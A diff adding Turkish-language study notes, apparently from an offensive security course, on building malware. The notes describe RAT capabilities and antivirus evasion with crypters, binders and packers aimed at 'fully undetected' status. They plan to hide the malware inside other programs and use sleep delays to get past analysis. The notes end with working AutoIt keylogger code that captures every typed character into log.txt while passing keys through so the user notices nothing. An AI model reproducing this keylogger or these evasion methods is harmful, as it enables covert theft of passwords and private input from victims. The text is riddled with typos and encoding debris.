@@ -1,0 +1,118 @@
+Zararli yazilimlar |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+---------------------------------------------------|
+Trojen-botnet-ransomware-adware-Rat                |
+Rat= dosyalara erisebilir,komut calistirabilir.    |
+saldirgan o makineÃuzerinden tum kontrol saglanir. |
+rat kullanim ornegi | keyloger ornegi | ransomware |
+---------------------------------------------------|
+icon archive = icon indirip klasorlere verebilriaz.|
+bot-net = zombi agi olarakda bilinir.              |
+----------------------------------------------------------------|
+Manager kismindan butun dosya sistemine erisebiliriz.           |
+Process Mnaeger dan istenileni yabaliiriz.                      |
+Rmeote shell ile uzaktan komut Ãcalistirabiliriz.               |
+Remote destop ile karsi makineyi izleyeblirisz.                 |
+Keyloger ozelligi ile klavye girdilerine ulasabilirsiniz.       |
+chat Ãozellegi ile karsi taraf ile iletisime gecilebillir       |
+Run file ile dosya gonderip calistirilabilir.                   |
+----------------------------------------------------------------------------|
+virustotal ile olusurudugumuzun zararli yazilimi kontrol ediyoruz.          |
+bazi start ayarlari mevcut duruma gore bilgisayar her acilista calisir.     |
+ilerleyen zamanlarda baska programalarin icine gizlicez.                    |
+-----------------------------------------------------------------------------
+AntiVirusler.|
+----------------------------------------------------------------------
+imzaya dayali antivurusler. = zararli yazilim veritabani tutar.      |
+sezgisel antivurusler. 	    = exe'nin aktivitelerini tarar.          |
+---------------------------------------------------------------------------------------
+Windows defender tanimadigi her dosyayi suunucularina alir inceler.(ozellik acik ise) |
+Virustotal'e gonderilen hersey incelemeye gonderiliyor.antivurus sirketlerine.(dikkat)|
+nodistribete ' virus total benzeri ucretsiz                                           |
+---------------------------------------------------------------------------------------
+Detected	=yakalanan zararli yazilim
+undetected	=bazilari tarafindan yakalanan zararli yazilim
+fully undetected=yakalanmaya zararli yazlim
+---------------------------------------------------------------------------------------------------------
+Cypter = yeni bir dosya veriyor. 2 dosyanin birlesmesi.setup dosyasi ve zararli yazilim birlestiriliyor.|
+zararli yaziliimi cypterliyoruz bize yeni bir exe veriyor.
+Scantime cypter = dosyayi biryere cikartip calistir.
+runtime cypter = direkt memory Ãuzerinde calistirir.
+Cypter kullanim alanlari.
+Binder = 2 dosyayi birlestirmeye yarar.|zararli yazilim + dosyayi secip birlestiriyorz + uzatisini degistiremeyiz|
+------------------------------------------------------------------------------------------------------------------
+Packer = exe'nin sikilastirilmasinda kullaniliyor.basit bir kullanimi vardir.Bypass olarak kullanilabilir.
+Ama sezgisel antivusuler yakalicaktir.
+------------------------------------------------------------------------------------------------------------------
+AutoIT = Eglenceli bir dil,Bos zamanlarinda goz at. 
+Zararli yazilim gelistirme = AutoIt ile gelistirilen zararli yazilimlari antivurusler tanimayabilir.
+-------------------------------
+Autoit ilk kod              \  f1 ile o fonksiyon hakkinda bilgiler alabilir.16 error codu.
+$data = "hellowowld"         = ekranda hellowowld yazan basligi yeni olan
+Msgbox(16,"yeni", $data)    /  bir box acar.kaynagina gidip sag tiklayip complier script dersem bir exe verir.
+------------------------------
+----------------------------------------------
+yap()					\ yap adinda bir fonkisyon acip
+Func yap()				\ fonsiyonun islevini tanimladik.
+	MsgBox(0,"baslik","merhaba")    / 0 tamma butonu getirir.
+EndFunc				 	/ f1 ile diger numaralarin nasil islevleri var gorbiliriz
+-----------------------------------------------
+----------------------------------------------------------------
+$sayi1=10;                                                      \ el-if yapisi calima sekli
+$sayi2=20;                                                       \ 
+if $sayi2 > $sayi1 Then                                           \
+	MsgBox(0,"baslik","ikicisayi daha buyuk")                  \
+Else                                                               /
+	MsgBox(0,"baslik","birinci sayi daha buyuk")               /
+Endif                                                              /
+-------------------------------------------------------------------------------------------------------
+For $i=5 to 1 Step -1           \
+	MsgBox(0,"Eksilt",$i)    \ 5 den 1 'e kadar eksiltme islemi yapar.
+Next                             / Eksilt butonuna bastikca 5-4-3-2-1 diye gider
+MsgBox(0,"","Son")              /  Son diye bir box gelir. Prgram kapanir.
+-------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------
+FileRead = | $DosyaIcerigi = FileRead("dosya_yolu") = ayni yerdelerse sadece dosya adi yeterli olucakti |
+           | MsgBox(0,"",DosyaIcerigi)              = acilan pencerede dosyanin icerigi goruncektir.    |
+------------------------------------------------------------------------------------------------------------
+FileWrite = | $DosyaIcerigi = FileWrite("dosya_yolu","icerisine yazilacak yazi") |
+----------------------------------------------------------------------------------
+While 1                             |\
+	MsgBox(0,"baslik","mesaj")  | | sonsuz while dongusu
+WEnd                                |/
+----------------------------------------------------------------------------------|
+MsgBox(0,"","ilk denme")            |\  bypass etmek icin kullanirli(sleep)anilizi engeller
+Sleep(5000)                         | } ilk denemeyi basar
+MsgBox(0,"baslik","mesaj icergi")   |/  5 sn bekler ikinci mesaji basar.
+----------------------------------------------------------------------------------|
+HotKeySet("s","basilantusfonkiyonu")  |
+Func basilantusfonkiyonu()            |
+	MsgBox(0,"",$HotKeyPressed)   |                                                             
+EndFunc                               |  s tu5unu calismaz hale getirir.
+While 1                               |
+	slepp(100);                   |
+WEnd                                  |
+----------------------------------------------------------------------------------|
+HotKeySet("a","basilantusfonksiyonu")                |
+Func basilantusfonksiyonu()                          |
+	$dosya=FileWrite("log.txt",@HotKeyPressed)   | tanimlanan tuslari
+EndFunc                                              | log dosyasinin icine atar.
+                                                     | klavyeden girilen ve tanimlanan
+While 1                                              | tuslari
+  Sleep(100);                                        |
+Wend                                                 |
+---------------------------------------------------------------------------------------------|
+For $i = 0 To 255					| Butun ascii karakterleri alir
+    HotKeySet(Chr($i),"basilantusfonksiyonu")		| for dongus ile klavyeden girilen 
+Next							| btun karakterleri alir bu sayede
+							|
+Func basilantusfonksiyonu()				| Bu fonksiyon bir dosya olusturur.
+     $dosya=FileWrite("log.txt",@HotKeyPressed)		| icine klavyeden girilen sayilari alir.
+     ControlSend("","","",@HotKeyPressed)		| sayilari tekrar kullaniciya iletir
+EndFunc							|
+							|
+While 1							| 100 saniyede bir
+     Sleep(100);					| tekrar eder.
+WEnd							|
+---------------------------------------------------------------------------------------------|
+title'le bakarak hedef bazli keyloger Ãuretimi 
+satashibox.
